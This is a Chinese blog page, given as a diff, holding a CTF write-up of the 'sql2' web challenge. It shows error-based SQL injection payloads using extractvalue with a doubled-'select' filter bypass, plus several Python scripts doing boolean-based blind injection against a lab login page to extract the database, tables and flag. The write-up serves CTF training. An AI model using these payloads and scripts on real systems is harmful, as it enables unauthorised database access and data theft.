@@ -1,0 +1,1056 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+<meta name="baidu-site-verification" content="mLMdqFLzjo" />
+<meta name="google-site-verification" content="7uHr04pXNVB5CV_DNSdpXbHErUHjpYDOT-B74_X6vhY" />
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/icon_180.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/logo2.svg?v=6.5.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.5.0',
+    sidebar: {"position":"left","width":300,"display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: 'WKHA6YLSNH',
+      apiKey: '46dba96b67832c36609d31c01e6772af',
+      indexName: 'blog',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="导语我没找到他的题目idXD">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《从0到1：CTFer成长之路》Web之sql2">
+<meta property="og:url" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/index.html">
+<meta property="og:site_name" content="π1L4r">
+<meta property="og:description" content="导语我没找到他的题目idXD">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/1.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/2.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/3.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/4.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/5.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/6.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/7.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/8.jpg">
+<meta property="article:published_time" content="2021-01-29T11:16:33.000Z">
+<meta property="article:modified_time" content="2021-01-29T11:49:14.702Z">
+<meta property="article:author" content="π1L4r">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/1.jpg">
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="π1L4r" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://www.smartpillar.xyz/2021/01/29/《从0到1：CTFer成长之路》Web之sql2/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>《从0到1：CTFer成长之路》Web之sql2 | π1L4r</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">π1L4r</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Stay sharp, stay cool</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />归档</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="π1L4r">
+      <meta itemprop="description" content="changed my nickname= =.">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="π1L4r">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">《从0到1：CTFer成长之路》Web之sql2
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021-01-29 19:16:33 / 修改时间：19:49:14" itemprop="dateCreated datePublished" datetime="2021-01-29T19:16:33+08:00">2021-01-29</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>我没找到他的题目idXD</p>
+<a id="more"></a>
+<p><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/1.jpg" alt></p>
+<h1 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h1><p>打开题目提示去login.php看。<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/2.jpg" alt><br>查看源代码，提示url加?tips=1开启报错，用burpsuit可以查看，立刻想到使用报错注入<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/3.jpg" alt><br>同时先简单尝试一下，发现账号存在字符注入，用单引号闭合（1’ or 1=1和1’ and 1=2）<br>使用burp，如下<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/4.jpg" alt><br>当然，借助右边回应是账号不存在还是账号错误可以进行布尔注入，但是既然有了提示，为什么不用呢？<br>使用extractvalue报错注入，得到database为note<br>1’ or 1=1 and (extractvalue(‘anything’,concat(‘~‘,(select database()))))#<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/5.jpg" alt><br>然后理所应当接下来操作是information_schema三连，但是他老说我语法有错，我看了半天直接心态小崩，搁网上找了找别人的wp，然后发现他过滤了select……于是双写select来information_schema三连。<br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(seselectlect group_concat(table_name) from information_schema.tables where table_schema=&#39;note&#39;))))#&amp;pass=456</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/6.jpg" alt><br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(seselectlect group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;))))#</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/7.jpg" alt><br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(selselectect flag from note.fl4g))))#</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/8.jpg" alt></p>
+<p>然后我还顺着我看的wp的做法整了一遍布尔注入。<br>爆数据库长度</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">string</span><br> <br> <br>dic = <span class="hljs-built_in">string</span>.digits + <span class="hljs-built_in">string</span>.ascii_letters + <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span><br>right = <span class="hljs-string">'8bef'</span><br>url = <span class="hljs-string">'http://eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com/login.php'</span><br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>):<br>    key = <span class="hljs-string">"admin' and "</span> + <span class="hljs-string">"(length(database())="</span> + str(i) + <span class="hljs-string">")#"</span><br>    <span class="hljs-built_in">data</span> = &#123;<span class="hljs-string">'name'</span>:key, <span class="hljs-string">'pass'</span>:<span class="hljs-string">'123'</span>&#125;<br>    r = requests.post(url, <span class="hljs-built_in">data</span>=<span class="hljs-built_in">data</span>).text<br>    #print(r)<br>    <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> str(r):<br>        print(<span class="hljs-string">'the length of database is %s'</span> %i)<br></code></pre></td></tr></table></figure>
+
+<p>爆数据库名</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br> <br> <br>dic = string.digits + string.ascii_letters + <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span><br>length=<span class="hljs-number">4</span><br><span class="hljs-keyword">name</span>=<span class="hljs-string">''</span><br>right = <span class="hljs-string">'8bef'</span><br>url = <span class="hljs-string">'http://eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com/login.php'</span><br><span class="hljs-keyword">for</span> j <span class="hljs-built_in">in</span> range(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> range(<span class="hljs-number">65</span>,<span class="hljs-number">123</span>):<br>        key = <span class="hljs-string">"admin'"</span>+<span class="hljs-string">" and (ascii(substr(database(),%d,1))=%d)#"</span>%(j,i)<br>        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'name'</span>:key, <span class="hljs-string">'pass'</span>:<span class="hljs-string">'111'</span>&#125;<br>        r = requests.post(url, <span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).<span class="hljs-keyword">text</span><br>        <span class="hljs-keyword">if</span> right <span class="hljs-built_in">in</span> str(r):<br>            <span class="hljs-keyword">name</span>+=chr(i)<br>            print(<span class="hljs-keyword">name</span>)<br></code></pre></td></tr></table></figure>
+
+<p>爆表长</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">string</span><br> <br> <br>dic = <span class="hljs-built_in">string</span>.digits + <span class="hljs-built_in">string</span>.ascii_letters + <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span><br>right = <span class="hljs-string">'8bef'</span><br>url = <span class="hljs-string">'http://eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com/login.php'</span><br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>):<br>    key = <span class="hljs-string">"admin' and "</span> + <span class="hljs-string">"length((sselectelect table_name FROM information_schema.tables WHERE table_schema=0x6e6f7465 limit 0,1))="</span> + str(i) + <span class="hljs-string">"#"</span><br>    <span class="hljs-built_in">data</span> = &#123;<span class="hljs-string">'name'</span>:key, <span class="hljs-string">'pass'</span>:<span class="hljs-string">'111'</span>&#125;<br>    r = requests.post(url, <span class="hljs-built_in">data</span>=<span class="hljs-built_in">data</span>).text<br>    #print(r)<br>    <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> str(r):<br>        print(<span class="hljs-string">'the length of table is %s'</span> %i)<br></code></pre></td></tr></table></figure>
+<p>爆表</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span><span class="hljs-built_in"> string</span><br><br> <br>dic =<span class="hljs-built_in"> string</span>.digits +<span class="hljs-built_in"> string</span>.ascii_letters + <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span><br>length=<span class="hljs-number">4</span><br>name=<span class="hljs-string">''</span><br>right = <span class="hljs-string">'8bef'</span><br>url = <span class="hljs-string">'http://eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com/login.php'</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">48</span>,<span class="hljs-number">123</span>):<br>        <span class="hljs-built_in">#key</span> = <span class="hljs-string">"admin%1$' and "</span> + <span class="hljs-string">"(substr(database(),0,1)="</span> + i + <span class="hljs-string">")#"</span><br>        <span class="hljs-built_in">#key</span> = <span class="hljs-string">"admin%1$' and "</span> + <span class="hljs-string">"(substr(database(),"</span>+str(j)+<span class="hljs-string">",1)="</span> + i + <span class="hljs-string">")#"</span><br>       <span class="hljs-built_in"> key</span> = <span class="hljs-string">"admin'"</span>+<span class="hljs-string">" and (ascii(substr((seselectlect  table_name FROM information_schema.tables WHERE table_schema=0x6e6f7465 limit 0,1),%d,1))=%d)#"</span>%(j,i)<br>        data = &#123;<br>    <br>    <span class="hljs-string">'name'</span>:key, <span class="hljs-string">'pass'</span>:<span class="hljs-string">'111'</span>&#125;<br>        r = requests.post(url, data=data).<span class="hljs-type">text</span><br>        <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> str(r):<br>           <span class="hljs-built_in"> name</span>+=chr(i)<br>            print<span class="hljs-built_in">(name</span>)<br></code></pre></td></tr></table></figure>
+<p>爆列长</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">string</span><br><br> <br>dic = <span class="hljs-built_in">string</span>.digits + <span class="hljs-built_in">string</span>.ascii_letters + <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span><br>right = <span class="hljs-string">'8bef'</span><br>url = <span class="hljs-string">'http://eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com/login.php'</span><br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>):<br>    key = <span class="hljs-string">"admin' and "</span> + <span class="hljs-string">"length((seselectlect column_name FROM information_schema.columns WHERE table_name=0x666c3467 limit 0,1))="</span> + str(i) + <span class="hljs-string">"#"</span><br>    <span class="hljs-built_in">data</span> = &#123;<span class="hljs-string">'name'</span>:key, <span class="hljs-string">'pass'</span>:<span class="hljs-string">'111'</span>&#125;<br>    r = requests.post(url, <span class="hljs-built_in">data</span>=<span class="hljs-built_in">data</span>).text<br>    #print(r)<br>    <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> str(r):<br>        print(<span class="hljs-string">'the length of column is %s'</span> %i)<br></code></pre></td></tr></table></figure>
+<p>爆列</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span><span class="hljs-built_in"> string</span><br> <br> <br>dic =<span class="hljs-built_in"> string</span>.digits +<span class="hljs-built_in"> string</span>.ascii_letters + <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span><br>length=<span class="hljs-number">4</span><br>name=<span class="hljs-string">''</span><br>right = <span class="hljs-string">'8bef'</span><br>url = <span class="hljs-string">'http://eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com/login.php'</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">48</span>,<span class="hljs-number">123</span>):<br>        <span class="hljs-built_in">#key</span> = <span class="hljs-string">"admin%1$' and "</span> + <span class="hljs-string">"(substr(database(),0,1)="</span> + i + <span class="hljs-string">")#"</span><br>        <span class="hljs-built_in">#key</span> = <span class="hljs-string">"admin%1$' and "</span> + <span class="hljs-string">"(substr(database(),"</span>+str(j)+<span class="hljs-string">",1)="</span> + i + <span class="hljs-string">")#"</span><br>       <span class="hljs-built_in"> key</span> = <span class="hljs-string">"admin'"</span>+<span class="hljs-string">" and (ascii(substr((seselectlect  column_name FROM information_schema.columns WHERE table_name=0x666c3467 limit 0,1),%d,1))=%d)#"</span>%(j,i)<br>        data = &#123;<span class="hljs-string">'name'</span>:key, <span class="hljs-string">'pass'</span>:<span class="hljs-string">'111'</span>&#125;<br>        r = requests.post(url, data=data).<span class="hljs-type">text</span><br>        <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> str(r):<br>           <span class="hljs-built_in"> name</span>+=chr(i)<br>            print<span class="hljs-built_in">(name</span>)<br></code></pre></td></tr></table></figure>
+<p>爆flag长</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">string</span><br> <br> <br>dic = <span class="hljs-built_in">string</span>.digits + <span class="hljs-built_in">string</span>.ascii_letters + <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span><br>right = <span class="hljs-string">'8bef'</span><br>url = <span class="hljs-string">'http://eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com/login.php'</span><br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">60</span>):<br>    key = <span class="hljs-string">"admin' and "</span> + <span class="hljs-string">"length((seselectlect flag FROM fl4g limit 0,1))="</span> + str(i) + <span class="hljs-string">"#"</span><br>    <span class="hljs-built_in">data</span> = &#123;<span class="hljs-string">'name'</span>:key, <span class="hljs-string">'pass'</span>:<span class="hljs-string">'111'</span>&#125;<br>    r = requests.post(url, <span class="hljs-built_in">data</span>=<span class="hljs-built_in">data</span>).text<br>    #print(r)<br>    <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> str(r):<br>        print(<span class="hljs-string">'the length of column is %s'</span> %i)<br></code></pre></td></tr></table></figure>
+<p>爆flag</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br> <br><br>dic = string.digits + string.ascii_letters + <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span><br>length=<span class="hljs-number">26</span><br><span class="hljs-keyword">name</span>=<span class="hljs-string">''</span><br>right = <span class="hljs-string">'8bef'</span><br>url = <span class="hljs-string">'http://eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com/login.php'</span><br><span class="hljs-keyword">for</span> j <span class="hljs-built_in">in</span> range(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> dic:<br>        key = <span class="hljs-string">"admin'"</span>+<span class="hljs-string">" and (ascii(substr((sselectelect flag FROM fl4g limit 0,1),%d,1))="</span>%j+str(ord(i))+<span class="hljs-string">")#"</span><br>        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'name'</span>:key, <span class="hljs-string">'pass'</span>:<span class="hljs-string">'111'</span>&#125;<br>        r = requests.post(url, <span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).<span class="hljs-keyword">text</span><br>        <span class="hljs-keyword">if</span> right <span class="hljs-built_in">in</span> str(r):<br>            <span class="hljs-keyword">name</span>+=i<br>            print(<span class="hljs-keyword">name</span>)<br></code></pre></td></tr></table></figure>
+
